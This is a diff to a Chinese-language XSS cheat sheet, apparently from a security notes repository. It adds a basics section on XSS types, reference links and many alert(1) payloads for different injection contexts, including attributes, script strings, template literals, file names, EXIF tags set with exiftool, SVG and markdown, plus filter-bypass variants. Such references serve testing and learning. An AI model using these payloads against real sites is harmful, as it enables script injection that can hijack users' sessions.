@@ -25,6 +25,7 @@
 - [探索XSS利用编码绕过的原理](https://saucer-man.com/information_security/103.html)
 - [通过XSS窃取localStorage中的JWT](http://www.arkteam.net/?p=4453)
 - [坑死我的HTTPOnly](http://gv7.me/articles/2017/Session-Cookie-without-Secure-flag-set/)
+- [WAF攻防实践(4)](https://mp.weixin.qq.com/s/AS1cpMqr1WkuoLmRld_p0w)
 
 **相关案例**
 - [BugBounty:Twitter 蠕虫 XSS](https://xz.aliyun.com/t/5050)
@@ -36,6 +37,7 @@
 - [XSS attacks on Googlebot allow search index manipulation](https://www.tomanthony.co.uk/blog/xss-attacks-googlebot-index-manipulation/)
 - [挖洞经验 | 看我如何发现亚马逊网站的反射型XSS漏洞](https://www.freebuf.com/articles/web/175606.html)
 - [How I alert(1) in Azure DevOps](https://5alt.me/2019/02/xss-in-azure-devops/)
+- [Stored XSS to Organisation Takeover](https://infosecwriteups.com/stored-xss-to-organisation-takeover-6eaaa2fdcd5b)
 
 **工具**
 - [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) - XSS 检测工具,效果一般
@@ -111,6 +113,202 @@
 
 ---
 
+# 基础
+
+## 什么是 XSS
+
+跨站点脚本 (XSS) 攻击是一种注入，Web 程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了 HTML 页面的原有逻辑，攻击者可以利用该漏洞执行恶意 HTML/JS 代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。
+
+XSS 攻击有 3 种类型：
+
+- 反射型 XSS : 通过网络浏览器从另一个网站运行恶意脚本的攻击
+- 存储型 XSS : 存储型是将注入的脚本永久存储在目标服务器上的攻击
+- 基于DOM的XSS : 一种在 DOM 结构中而不是在 HTML 代码中触发的 XSS。
+
+## XSS Payload
+
+### 最基础的
+```html
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+```
+
+### 在标签内部的
+```html
+" onmouseover=alert(1)
+" autofocus onfocus=alert(1)
+
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+
+</tag><script>alert(1)</script>
+"></tag><script>alert(1)</script>
+
+</script><script>alert(1)</script>
+```
+
+示例1
+```html
+<input id="keyword" type="text" name="q" value="example">
+<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
+```
+
+示例2
+```html
+<input id="keyword" type="text" name="q" value="example">
+<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
+```
+
+示例3
+```html
+<a href="https://target.com/1?status=example">1</a>
+<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
+```
+
+示例4
+```html
+<script>
+    var sitekey = 'example';
+</script>
+
+<script>
+    var sitekey = '</script><script>alert(1)</script>';
+</script>
+```
+
+**通过注释转义的**
+```html
+--><script>alert(1)</script>
+<!-- --><script>alert(1)</script> -->
+```
+
+**在 script 中**
+```js
+'-alert(1)-'
+'/alert(1)//
+```
+
+示例
+```html
+<script>
+    var sitekey = 'example';
+</script>
+
+<script>
+    var sitekey = ''-alert(1)-'';
+</script>
+```
+
+**在 script 中,但输出在字符串分隔值内，引号被反斜杠转义**
+```js
+\'alert(1)//
+```
+
+示例
+```html
+<script>
+    var sitekey = 'example';
+</script>
+
+<!-- 使用 -alert(1)- 的结果 -->
+<script>
+    var sitekey = '\'-alert(1)-\'';
+</script>
+
+<!-- 绕过反斜杠转义 -->
+<script>
+    var sitekey = '\\'alert(1)//';
+</script>
+```
+
+**一行 JS 内多个值**
+```js
+/alert(1)//\
+/alert(1)}//\
+```
+
+示例
+```html
+<script>
+    var a = 'example'; var b = 'example';
+</script>
+
+<script>
+    var a = '/alert(1)//\'; var b = '/alert(1)//\';
+</script>
+```
+
+**条件控制语句内的值**
+```js
+'}alert(1);{'
+\'}alert(1);{//
+```
+
+示例
+```html
+<script>
+    var greeting;
+    var time = 1;
+    if (time < 10) {
+    test = 'example';
+  }
+</script>
+
+<script>
+    var test;
+    var time = 1;
+    if (time < 10) {
+    test = ''}alert(1);{'';
+  }
+</script>
+```
+
+**反引号内的值**
+```js
+${alert(1)}
+```
+
+示例
+```html
+<script>
+    var dapos = `example`;
+</script>
+
+<script>
+    var dapos = `${alert(1)}`;
+</script>
+```
+
+### 用在其他功能点
+
+**文件名**
+```
+"><svg onload=alert(1)>.png
+```
+
+**exif 数据**
+```bash
+exiftool -Artist='"><script>alert(1)</script>' test.jpeg
+```
+
+**SVG**
+```svg
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+```
+
+**markdown**
+```
+[Click Me](javascript:alert('1'))
+```
+
+**xml**
+```xml
+<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
+```
+
+---
+
 # Bypass
 
 1. 使用无害的 payload,类似`<b>,<i>,<u>`观察响应,判断应用程序是否被 HTML 编码,是否标签被过滤,是否过滤 `<>` 等等;
@@ -140,9 +338,14 @@ onerror
 ```
 
 **过滤关键字,大小写绕过**
-```js
+```html
 <ImG sRc=x onerRor=alert("xss");>
 <scRiPt>alert(1);</scrIPt>
+```
+
+**不闭合**
+```js
+<svg onload="alert(1)"
 ```
 
 **拼接**
